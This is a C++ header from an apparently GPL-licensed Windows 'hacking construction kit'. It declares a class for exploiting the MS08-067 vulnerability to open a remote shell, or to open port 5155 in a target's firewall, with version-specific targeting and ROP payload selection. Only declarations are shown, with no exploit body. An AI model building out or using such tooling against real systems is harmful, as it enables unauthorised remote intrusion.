/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

#include "tcp.h"
#include "payload.h"

// exploit ms08-067
class Ms08067 {
public:
	// we need the correct windows xp version for exploit
	enum windows_version {
		sp3,
		sp2,
		windows2000,
		sp0,
		windows2003sp0,
		windows2003sp1english,
		windows2003sp1japanese,
		windows2003sp2english,
		windows2003sp2german	
	};

	~Ms08067();

	// return a socket from this target on port 5155
	static Tcp getCommandSocket(char *target);

	// thread used for RPC call
	static DWORD WINAPI sendPayload(LPVOID lpParam);

	// try to use ms08-067 to open a remote shell on this target (port 5155)
	static bool getAShell(char *target, windows_version version = sp3);

	// try to use ms08-067 to open port 5155 on firewall on this target
	static bool openPort(char *target, windows_version version = sp3);

	static HANDLE handle;

	static bool result;

private:
	Ms08067();

	static Ms08067 single;
	// try to open a shell on this target
	static bool attack(char *target, windows_version version, bool getAShell);

	static unsigned char *getPayload(bool getShellPayload, Payload::Rop rop);

};